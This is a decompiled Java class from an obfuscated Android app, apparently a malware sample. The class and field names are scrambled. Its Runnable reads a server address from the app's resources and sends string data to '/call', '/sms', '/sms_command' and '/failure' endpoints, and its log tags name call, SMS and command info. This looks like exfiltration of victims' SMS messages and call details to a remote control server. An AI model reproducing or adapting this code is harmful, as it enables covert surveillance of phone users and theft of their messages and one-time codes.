package com.vdodsodjsdt;

import android.content.Context;
import android.util.Log;

/* JADX INFO: compiled from: r8-map-id-3f77bbef96f83a8bf86e140490b9d41fcf0723d2c79bd2f3f370cb94135e1be4 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class klTFaDtrPxx8 implements Runnable {
    public final /* synthetic */ String LaeGQIruHQu81hfJldjMOQSVblH3x;
    public final /* synthetic */ int V57tEvNfxZVVcOCAOih5PKr;
    public final /* synthetic */ Context ZfQNn8hdWlEQ5cR94249PDsLR;

    public /* synthetic */ klTFaDtrPxx8(int i, Context context, String str) {
        this.V57tEvNfxZVVcOCAOih5PKr = i;
        this.ZfQNn8hdWlEQ5cR94249PDsLR = context;
        this.LaeGQIruHQu81hfJldjMOQSVblH3x = str;
    }

    @Override // java.lang.Runnable
    public final void run() throws Throwable {
        switch (this.V57tEvNfxZVVcOCAOih5PKr) {
            case 0:
                String str = this.LaeGQIruHQu81hfJldjMOQSVblH3x;
                Context context = this.ZfQNn8hdWlEQ5cR94249PDsLR;
                String string = context.getResources().getString(R.string.HOST);
                ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(string, "getString(...)");
                try {
                    VSncX8ksA0tswc2TMhzhOMdd.VxUQ9tBhpHJ2AAEDNW8sghc4m(string.concat("/call"), str, context, null, 8);
                } catch (Exception unused) {
                    Log.d("sendCallInfo", "Error sending request");
                    return;
                }
                break;
            case 1:
                String str2 = this.LaeGQIruHQu81hfJldjMOQSVblH3x;
                Context context2 = this.ZfQNn8hdWlEQ5cR94249PDsLR;
                String string2 = context2.getResources().getString(R.string.HOST);
                ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(string2, "getString(...)");
                try {
                    VSncX8ksA0tswc2TMhzhOMdd.VxUQ9tBhpHJ2AAEDNW8sghc4m(string2.concat("/sms"), str2, context2, null, 8);
                } catch (Exception unused2) {
                    Log.d("sendSmsInfo", "Error sending request");
                    return;
                }
                break;
            case g8kevnL6UKpr15IYtcPJXuLo1L4.FLOAT_FIELD_NUMBER /* 2 */:
                String str3 = this.LaeGQIruHQu81hfJldjMOQSVblH3x;
                Context context3 = this.ZfQNn8hdWlEQ5cR94249PDsLR;
                String string3 = context3.getResources().getString(R.string.HOST);
                ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(string3, "getString(...)");
                try {
                    VSncX8ksA0tswc2TMhzhOMdd.VxUQ9tBhpHJ2AAEDNW8sghc4m(string3.concat("/sms_command"), str3, context3, null, 8);
                } catch (Exception unused3) {
                    Log.d("sendCommandInfo", "Error sending request");
                    return;
                }
                break;
            default:
                String str4 = this.LaeGQIruHQu81hfJldjMOQSVblH3x;
                Context context4 = this.ZfQNn8hdWlEQ5cR94249PDsLR;
                String string4 = context4.getResources().getString(R.string.HOST);
                ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(string4, "getString(...)");
                try {
                    VSncX8ksA0tswc2TMhzhOMdd.VxUQ9tBhpHJ2AAEDNW8sghc4m(string4.concat("/failure"), str4, context4, null, 8);
                } catch (Exception unused4) {
                    Log.d("sendFailureInfo", "Error sending request");
                }
                break;
        }
    }
}
